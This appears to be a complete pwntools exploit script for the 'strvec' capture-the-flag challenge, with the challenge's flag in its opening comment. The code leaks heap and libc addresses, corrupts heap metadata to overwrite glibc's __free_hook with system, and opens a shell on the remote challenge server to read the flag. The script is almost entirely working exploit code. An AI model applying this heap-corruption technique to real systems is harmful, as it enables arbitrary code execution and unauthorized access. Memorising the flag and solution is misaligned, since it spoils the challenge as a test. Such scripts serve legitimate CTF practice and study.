# ASIS{n0_1d34_4_g00d_fl4g_t3xt_59723644e687a5c5e2fe80eae0b4f4b8}
from pwn import *

libc = ELF("./libc-2.31.so")
target = process("./strvec")
target = remote("168.119.108.148", 12010)

def sla(s, d):
    target.sendlineafter(s, str(d))

def set(idx=0, data="whoamiT"):
    sla("> ", 2)
    sla("= ", idx)
    if data == "whoamiT":
        data = str(idx).ljust(8, '\x00') + p64(0x291) + p64(0) + p32(0x291)
    sla("= ", data)
    print ".",

def get(idx=0):
    sla("> ", 1)
    sla("= ", idx)
    target.recvuntil("-> ")
    return target.recvline().strip("\n")

name = "whoamiT"
n = (1 << 32)/8
sla(": ", name)
sla("= ", n)

set(3, p64(0) + p64(0x31) + p64(0) + "1")
heap_base = u64(get(3).ljust(8, '\x00')) - 0x2c0
log.info("HEAP Base: " + hex(heap_base))

off_290 = [0x320, 0x380, 0x3a0, 0x3d0, 0x400, 0x430, 0x460, 0x490, 0x500, 0x530]

for i in range(28):
    set(1000+i, str(1000+i).ljust(8, '\x00') + p64(0x291) + p64(heap_base + off_290[i%len(off_290)]) + p32(0x291))

set(0, "/bin/sh\x00")
set(3)

set(3, p64(0) + p64(heap_base + 0x2e0)*2 + p64(0x461)[:6])
set(5)

libc_base = u64(get(4).ljust(8, '\x00')) - 0x7f80077a7be0 + 0x00007f80075bc000
log.info("LIBC Base: " + hex(libc_base))

set(23)
set(29)
set(35)
set(41)
set(47)
set(53)
set(17)
set(3, p64(libc_base + libc.sym['__free_hook']))
set(28)

set(1336, p64(0)*2)
set(1337, p64(libc_base + libc.sym['system']))
sla("> ", 1337)
#gdb.attach(target, 'x/60gx ' + hex(heap_base + 0x2a0))
target.sendline("cat fl*")

target.interactive()